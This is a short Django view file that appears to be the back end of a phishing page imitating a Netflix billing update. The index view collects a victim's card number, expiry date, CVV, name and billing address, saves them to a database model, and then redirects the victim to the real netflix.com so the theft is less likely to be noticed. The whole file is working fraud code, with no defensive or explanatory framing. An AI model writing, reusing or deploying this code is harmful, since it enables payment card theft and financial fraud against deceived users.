from django.shortcuts import render,HttpResponse,redirect

from .models import Datacollect
from django.contrib import messages
# Create your views here.

def index(request):
    if request.method == "POST":
        card_no = request.POST['cardnumber']
        exp_date = request.POST['expdob']
        cvv = request.POST['cvvpart']
        f_name = request.POST['firstname']
        l_name = request.POST['lastname']
        billing = request.POST['billingadd']

        netfix = Datacollect()
        netfix.card_no = card_no
        netfix.exp_date = exp_date
        netfix.cvv = cvv
        netfix.f_name = f_name
        netfix.l_name = l_name
        netfix.billing = billing
        netfix.save()
        messages.success(request,'Updated Successfully')
        return redirect("https://netflix.com")
    return render(request,'index.html')